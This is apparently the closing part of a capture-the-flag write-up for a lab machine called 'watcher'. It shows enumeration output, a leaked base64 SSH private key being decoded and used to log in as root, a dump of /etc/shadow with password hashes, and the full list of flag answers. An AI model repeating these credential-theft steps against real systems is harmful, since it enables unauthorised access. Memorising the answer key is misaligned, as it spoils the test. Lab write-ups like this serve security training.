+,408 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,570 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,570 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,504 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,504 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,645 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,645 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,195 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,195 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,919 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,919 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,996 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,996 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,126 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,126 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,502 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,502 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+Binary file /var/log/journal/ec6c05333ff74080b8bd26a785d12724/system@0005b585ee67923d-9c5fd83b91fe8512.journal~ matches
+Binary file /var/log/journal/ec6c05333ff74080b8bd26a785d12724/system.journal matches
+Binary file /var/log/journal/ec6c05333ff74080b8bd26a785d12724/user-1000.journal matches
+Binary file /var/log/journal/ec6c05333ff74080b8bd26a785d12724/user-1002.journal matches
+Dec 03 01:31:11 ubuntu-server chage[14591]: changed password expiry for sshd
+Dec 03 01:31:11 ubuntu-server usermod[14586]: change user 'sshd' password
+Dec 12 15:21:16 watcher kernel: [    6.839382] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+Dec 12 15:21:16 watcher systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Dec 12 15:22:41 watcher sshd[2566]: Accepted password for will from 192.168.153.128 port 37134 ssh2
+Dec 12 15:52:14 watcher kernel: [    9.796182] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+Dec 12 15:52:14 watcher sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.log
+Dec 12 15:52:14 watcher systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Dec  3 01:34:39 watcher systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Dec  3 01:35:22 watcher kernel: [    4.333882] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+Dec  3 01:38:37 watcher sshd[1296]: Accepted password for will from 192.168.153.128 port 55674 ssh2
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+will@watcher:/tmp$ cd /opt/backups/
+cd /opt/backups/
+will@watcher:/opt/backups$ ls
+ls
+key.b64
+will@watcher:/opt/backups$ cat key.b64
+cat key.b64
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
+OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
+WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
+ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
+TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
+T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
+bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
+QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
+YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
+VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
+cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
+cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
+c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
+QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
+dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
+UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
+TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
+QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
+TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
+dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
+K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
+U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
+NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
+TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
+WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
+bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
+NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
+bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
+STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
+LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ echo "....                                                                           
+TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
+dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
+K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
+U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
+NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
+TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
+WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
+bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
+NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
+bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
+STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
+LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=" | base64 -d
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
+opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
+jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
+nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
+eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
+dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
+9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
+q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
+BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
+TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
+1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
+AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
+fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
+Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
+7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
+vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
+UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
+SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
+A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
+gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
+bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
+kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
+mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
+/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
+4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
+-----END RSA PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano will_idrsa
+                                                                                    
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 will_idrsa    
+                                                                                    
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i will_idrsa root@10.10.46.15            
+The authenticity of host '10.10.46.15 (10.10.46.15)' can't be established.
+ED25519 key fingerprint is SHA256:/60sf9gTocupkmAaJjtQJTxW1ZnolBZckE6KpPiQi5s.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.46.15' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+33 packages can be updated.
+0 updates are security updates.
+
+Last login: Thu Dec  3 03:25:38 2020
+root@watcher:~# ls
+flag_7.txt
+root@watcher:~# cat flag_7.txt
+FLAG{who_watches_the_watchers}
+root@watcher:~# ls -lah
+total 40K
+drwx------  6 root root 4.0K Dec  3  2020 .
+drwxr-xr-x 24 root root 4.0K Dec 12  2020 ..
+lrwxrwxrwx  1 root root    9 Dec  3  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  2 root root 4.0K Dec  3  2020 .cache
+-rw-r--r--  1 root root   31 Dec  3  2020 flag_7.txt
+drwx------  3 root root 4.0K Dec  3  2020 .gnupg
+drwxr-xr-x  3 root root 4.0K Dec  3  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Dec  3  2020 .selected_editor
+drwx------  2 root root 4.0K Dec  3  2020 .ssh
+root@watcher:~# cat .bash_history
+root@watcher:~# cat /etc/shadow
+root:$6$UseANeHi$f02vVBMbk9b5LRepJhjdhquXMJ6aBOi1IwQ3EJqF.dbhC0XCNDcZ4kmCVxR.3vNKr4ol0HzTIYXR6ATpYjDwJ1:18599:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18599:0:99999:7:::
+will:$6$PMxyf2rOO/k.yQyc$o5EbluoIAvLUeOivGTHqx6opAGuHit2d8wBWtFD7xWyJBTt680a/7917Wcg6fi83ubwnFhWFlPmYJjRKWwp0m.:18599:0:99999:7:::
+ftp:*:18599:0:99999:7:::
+ftpuser:$6$ag2r/3kP$9N1nbsh10Vb0WFHXGza.fnWNjbiPGiuYZ2nRGiq3/cR1SDPCyVi9GSrgeYBP/9wfzsFvRsIL3cJIsFUCL1741.:18599:0:99999:7:::
+mat:$6$yCP235ym$3EE8j2pgbseXTOvIOA23rWHGzO3UesHWdOUoesyJFpCkHmUwspwyPtbxUCvfuba8yi69LrYIMJnyUjJ07M1M21:18599:0:99999:7:::
+toby:$6$c9ZzrH1h$KII6cn/29vuk2cSxA5HC56UJ9BfRhmIDapaB2Bpkb7LATFQtVThblvo5f8Po2FmODE0a4pBcC7SNxlYnFkXO8.:18599:0:99999:7:::
+```
+Flag 1
+https://moz.com/learn/seo/robotstxt
+Flag 2
+https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/
+Flag 3
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2
+Flag 4
+https://www.explainshell.com/explain?cmd=sudo+-l
+Flag 5
+https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+Flag 6
+https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking
+Flag 7
+https://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host
+
+## Flags / Answers
+- ***FLAG{robots_dot_text_what_is_next}***
+- ***FLAG{ftp_you_and_me}***
+- ***FLAG{lfi_what_a_guy}***
+- ***FLAG{chad_lifestyle}***
+- ***FLAG{live_by_the_cow_die_by_the_cow}***
+- ***FLAG{but_i_thought_my_script_was_secure}***
+- ***FLAG{who_watches_the_watchers}***
+
+## Notes / Lessons Learned
+[[CMesS]]
+
